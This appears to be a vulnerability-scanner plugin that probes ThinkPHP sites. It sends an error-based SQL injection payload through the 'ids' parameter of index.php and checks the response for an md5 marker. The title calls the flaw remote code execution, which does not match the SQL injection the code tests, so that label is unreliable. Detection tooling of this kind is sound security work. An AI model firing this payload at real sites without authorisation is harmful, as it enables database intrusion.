# -*-* coding:UTF-8
import hashlib


class Plugin(Base):
    __info__ = {
        "name": "Thinkphp 5.0.23 远程代码执⾏漏洞",
        "description": "ThinkPHP是国内著名的开源的PHP框架",
        "references": ["-"]
    }

    def url(self) -> dict:
        random_str = self.build_random_str(5)
        hash_str = hashlib.md5(random_str.encode(encoding='UTF-8')).hexdigest()
        r = self.request(
            method='get',
            path=f"./index.php?ids[0,updatexml(0,concat(0xa,md5('{random_str}')),0)]=1",
        )
        if hash_str in r.text:
            return {"LoopholeInfo": self.__info__}
